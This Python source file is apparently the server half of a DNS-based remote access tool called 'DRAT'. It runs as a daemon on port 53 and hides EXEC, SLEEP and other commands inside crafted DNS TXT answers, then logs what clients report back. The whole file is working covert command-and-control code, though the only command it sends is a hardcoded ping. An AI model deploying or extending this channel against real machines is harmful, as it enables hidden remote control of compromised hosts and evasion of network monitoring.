#!/usr/bin/python3
"""
Name: DRAT Server
Author: K4YT3X
Date Created: April 7, 2021
Last Updated: April 13, 2021
"""

# built-in imports
import argparse
import base64
import errno
import os
import pathlib
import signal
import socket
import sys
import traceback

# third-party imports
import logzero

# process ID file to track running daemons
PID_FILE = pathlib.Path("/var/run/dratd/daemon.pid")

# UID and GID 65534 corresponds to the UID and GID of nobody and nogroup
DAEMON_UID = 65534
DAEMON_GID = 65534


class CMD:
    ACK = 0x01
    HELLO = 0x02
    INFO = 0x03
    EXEC = 0x04
    SLEEP = 0x05


def parseArguments() -> argparse.Namespace:
    """parse command line arguments

    Returns:
        argparse.Namespace: parsed argument namespace
    """
    parser = argparse.ArgumentParser(
        formatter_class=argparse.ArgumentDefaultsHelpFormatter
    )

    parser.add_argument(
        "action", help="daemon control action", choices=["start", "stop"]
    )

    parser.add_argument(
        "-a", "--address", help="socket binding address", default="127.0.0.1"
    )

    return parser.parse_args()


def makeAnswerBytes(queryId: bytes, domain: str, message: bytes) -> bytes:
    """construct the DNS answer bytes to be sent

    Args:
        queryId (bytes): ID of the query
        domain (str): domain name in the query
        message (bytes): message to be sent to

    Returns:
        bytes: bytes to be sent by socket
    """

    # construct the header section
    header = []
    header.append("1")  # QR (answer)
    header.append("0".zfill(4))  # OPCODE
    header.append("0")  # AA (not authoritative)
    header.append("0")  # TC (not truncated)
    header.append("1")  # RD (recursion desired)
    header.append("1")  # RA (recursion available)
    header.append("0")  # Z
    header.append("1")  # AD
    header.append("0")  # CD (non-authenticated data not accepted)
    header.append("0".zfill(4))  # RCODE (no errors)
    header.append("1".zfill(16))  # QDCOUNT (1 entry)
    header.append("1".zfill(16))  # ANCOUNT (1 entry)
    header.append("0".zfill(16))  # NSCOUNT (no authority records)
    header.append("0".zfill(16))  # ARCOUNT (no additional records)

    # construct the question section
    question = []
    question.append("10000".zfill(16))  # QTYPE (TXT)
    question.append("1".zfill(16))  # QCLASS (IN)

    # construct the answer section
    answer = []

    # only one name is expected, so NAME will always
    #   point to the same location (12)
    answer.append("1100000000001100".zfill(16))  # NAME
    answer.append("10000".zfill(16))  # TYPE (TXT)
    answer.append("1".zfill(16))  # CLASS (IN)
    answer.append("0".zfill(32))  # TTL (no caching)

    # construct the final query bytes
    response = bytes()
    response += queryId  # ID
    response += int("".join(header), 2).to_bytes(
        len("".join(header)) // 8, byteorder="big"
    )

    # convert domain name into labels
    for label in domain.split("."):
        response += bytes.fromhex(format(len(label), "x").zfill(2))
        response += label.encode("ascii")
    response += b"\x00"

    # add other query parameters
    response += int("".join(question), 2).to_bytes(
        len("".join(question)) // 8, byteorder="big"
    )

    # append the answer section
    response += int("".join(answer), 2).to_bytes(
        len("".join(answer)) // 8, byteorder="big"
    )

    # append RDLENGTH (0 bytes after RDATA)
    response += bytes.fromhex(format(0, "x").zfill(4))

    # append RDATA
    b64EncodedMessage = base64.b64encode(message)
    response += bytes.fromhex(format(len(b64EncodedMessage), "x").zfill(4))
    response += b64EncodedMessage

    return response


def makePayload(reqId: bytes, command: int, data: bytes):
    payload = bytes()
    payload += reqId
    payload += command.to_bytes(1, "big")
    payload += data
    return payload


def unpackQueryMessage(query: bytes) -> tuple:

    # the first two bytes are the query's ID
    queryId = query[:2]

    # start reading the labels
    # only one domain is expected here
    labels = []
    offset = 12

    # continue reading until the end is reached
    while offset < len(query) and query[offset] != 0:
        length = query[offset]
        labels.append(query[offset + 1 : offset + 1 + length])
        offset += length + 1

    # assemble the full domain name from labels
    domain = ".".join([s.decode("ascii") for s in labels])

    return queryId, domain, base64.b64decode(labels[0])


def waitChild(signalNumber: int, frame):
    """harvest zombie children

    Args:
        signalNumber (int): signal number
        frame (frame): stack frame
    """
    try:
        while True:

            # get the return status of any zombie child process available
            childPid, status = os.waitpid(-1, os.WNOHANG)

            # if PID is 0, no zombie child processes are available
            if childPid == 0:
                break
            # print(f"Child {childPid} exited with code {status >> 8}")
    except OSError as e:
        if e.errno != errno.ECHILD:
            raise


def createSocket(address: str, port: int) -> socket.socket:
    """create and bind a socket to the given address/port

    Args:
        address (str): address to bind to
        port (int): port to listen to

    Returns:
        socket.socket: handler of the created socket
    """
    # determine socket address family
    if "." in address:
        socketFamily = socket.AF_INET
    # elif ":" in args.address
    else:
        socketFamily = socket.AF_INET6

    # create and bind socket
    socketHandler = socket.socket(socketFamily, socket.SOCK_DGRAM)
    socketHandler.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    socketHandler.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
    socketHandler.bind((address, port))

    return socketHandler


def processQuery(query: bytes) -> bytes:
    queryId, domain, message = unpackQueryMessage(query)

    reqId = message[0:16]
    command = message[16]
    data = message[17:]

    if command == CMD.HELLO:
        # return makeAnswerBytes(queryId, domain, makePayload(reqId, CMD.INFO, b"\x00"))
        return makeAnswerBytes(
            queryId,
            domain,
            makePayload(
                reqId, CMD.EXEC, "/usr/bin/ping -c1 -W2 1.1.1.1".encode("utf8")
            ),
        )

    # elif command in [CMD.INFO, CMD.EXEC]:
    else:
        logzero.logger.info(
            "Client command {} returned {}".format(
                format(command, "x"), data.decode("utf8")
            )
        )
        # return makeAnswerBytes(queryId, domain, makePayload(reqId, CMD.ACK, b"\x00"))
        return makeAnswerBytes(queryId, domain, makePayload(reqId, CMD.SLEEP, b"\x00"))


def handleRequest(socketHandler: socket.socket, query: bytes, client: tuple) -> int:
    try:
        socketHandler.sendto(processQuery(query), client)
        return 0
    except Exception as error:
        logzero.logger.exception(error)
        return 1


def daemon(socketHandler: socket.socket) -> int:

    logzero.logger.info("Daemon started")

    # register SIGCHLD handler
    signal.signal(signal.SIGCHLD, waitChild)

    with socketHandler:
        while True:
            try:
                query, client = socketHandler.recvfrom(4096)
                logzero.logger.info(f"Client connection from {client[0]}")

                # fork new process
                pid = os.fork()

                # child process calls function to handle request
                if pid == 0:
                    return handleRequest(socketHandler, query, client)

            # end loop when exit signal is received
            except (SystemExit, KeyboardInterrupt):
                os.killpg(os.getpid(), signal.SIGTERM)
                return 0

            # upon exception, log exception and keep running
            except Exception as error:
                logzero.logger.exception(error)


def main() -> int:
    """main function of the program

    Raises:
        error: OSError if errno is not PID does not exist

    Returns:
        int: 0 if complete successfully, otherwise a different int
    """

    # parse command line arguments
    args = parseArguments()

    # setup logzero
    logzero.logfile("/var/log/dratd/daemon.log", disableStderrLogger=True)

    # if the action is start, try starting the daemon
    if args.action == "start":

        # if a PID file already exists, the daemon is already running
        if PID_FILE.is_file():
            logzero.logger.error(f"{PID_FILE.absolute()} already exists")
            return 1

        # if the PID file doesn't exist, lauch daemon and create a PID file
        else:

            logzero.logger.info("Starting DRAT server")

            # first fork
            pid = os.fork()

            # if the current process is the child
            if pid == 0:

                # second fork
                childPid = os.fork()

                # the grandchild starts running the daemon function
                if childPid == 0:

                    logzero.logger.info("Launching damon process")
                    returnValue = 0

                    try:

                        # create socket before downgrading the privileges
                        socketHandler = createSocket(args.address, 53)

                        # set UID, GID, and working directory
                        # GID must be set before the effective UID is changed
                        if os.getuid() == 0:
                            os.setgid(DAEMON_GID)
                            os.setuid(DAEMON_UID)
                        os.chdir(pathlib.Path(__file__).parent.absolute())

                        # close STDOUT, STDERR, and STDIN
                        sys.stdout.close()
                        sys.stderr.close()
                        sys.stdin.close()

                        # launch daemon
                        returnValue = daemon(socketHandler)
                    except Exception as error:
                        returnValue = 1
                        logzero.logger.exception(error)

                    finally:
                        return returnValue

                # the child writes the PID to the PID file and exit
                # this sets the grandchild's parent to init
                else:
                    logzero.logger.info(f"Grandchild forked, PID: {childPid}")
                    with PID_FILE.open("w") as pidFile:
                        pidFile.write(str(childPid))
                    logzero.logger.info("Child exiting")
                    return 0

            # if the current process is the parent
            else:
                logzero.logger.info(f"Child forked, PID: {pid}")
                logzero.logger.info("Parent exiting")
                return 0

    # if the action is stop, try killing the daemon
    elif args.action == "stop":

        logzero.logger.info("Stopping DRAT server")

        # if the PID file doesn't exist, the damon isn't running
        if not PID_FILE.exists():
            logzero.logger.error(f"{PID_FILE.absolute()} not found, daemon not running")
            return 1

        # if the PID file exists, send SIGTERM
        else:

            # read PID file
            with PID_FILE.open("r") as pidFile:
                daemonPid = int(pidFile.read().strip())

            # try sending SIGTERM to the process
            try:
                logzero.logger.info(f"Sending SIGTERM to PID {daemonPid}")
                os.kill(daemonPid, signal.SIGTERM)
            except PermissionError:
                logzero.logger.error(
                    f"Unable to kill process {daemonPid}: insufficient privileges"
                )
                raise
            except OSError as error:
                if error.errno != errno.ESRCH:
                    raise error

            # delete PID file and return
            logzero.logger.info(
                f"Daemon stopped, removing PID file {PID_FILE.absolute()}"
            )
            PID_FILE.unlink()
            return 0

    # if the action is undefined, exit with an error message
    else:
        print(f"Unknown action {args.action}", file=sys.stderr)
        return 1


# execute main if file is not imported
if __name__ == "__main__":
    try:
        sys.exit(main())
    except Exception:
        # more error handling can happen here if needed
        traceback.print_exc()
